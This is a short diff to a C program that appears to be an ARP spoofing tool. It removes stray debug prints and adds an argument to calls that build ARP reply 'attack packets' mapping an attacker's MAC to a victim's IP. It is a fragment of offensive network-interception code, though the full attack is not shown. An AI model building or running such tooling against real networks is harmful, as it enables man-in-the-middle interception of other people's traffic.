@@ -117,7 +117,6 @@ int main(){
     uint32_t subnet;
 
     while(1){
-        printf("htehaktsfkjsdlfjskldfjklsjfklsjdflkd\n");
         memset(rdata, 0x00, BUF_SIZE);
         recv_data(client_sock, rdata);
         int signal = atoi(&rdata[0]);
@@ -135,7 +134,6 @@ int main(){
             print_mac(attacker_info.mac);
 
             subnet = get_subnet(gw_info.iface_name);
-            printf("????????????????????\n");
             char str_subnet[30] {0, };
             sprintf(str_subnet, "%d.%d.%d.%d\n", (subnet)&0xFF, (subnet >> 8) & 0xFF, (subnet >> 16) & 0xFF, (subnet >> 24) & 0xFF);
         }
@@ -155,7 +153,8 @@ int main(){
 
             // make attack packet
             ARP_Packet * arp_data = (ARP_Packet *)malloc(sizeof(ARP_Packet));
-            make_arp_packet(ap_info.victim_mac, ap_info.attacker_mac, 0x2, ap_info.attacker_ip, ap_info.victim_ip, arp_data);
+            make_arp_packet(ap_info.victim_mac, ap_info.attacker_mac, 0x2, ap_info.attacker_ip, 
+            ap_info.victim_ip, arp_data, true);
             memcpy(ap_info.attack_pkt, arp_data, sizeof(ARP_Packet));
 
             ap_info.is_attack = 1;
@@ -201,7 +200,7 @@ int main(){
 
             // make attack packet
             ARP_Packet * arp_data = (ARP_Packet *)malloc(sizeof(ARP_Packet));
-            make_arp_packet(dev.victim_mac, dev.attacker_mac, 0x2, dev.attacker_ip, dev.victim_ip, arp_data);
+            make_arp_packet(dev.victim_mac, dev.attacker_mac, 0x2, dev.attacker_ip, dev.victim_ip, arp_data, true);
             memcpy(dev.attack_pkt, arp_data, sizeof(ARP_Packet));
 
             dev.is_attack = 1;
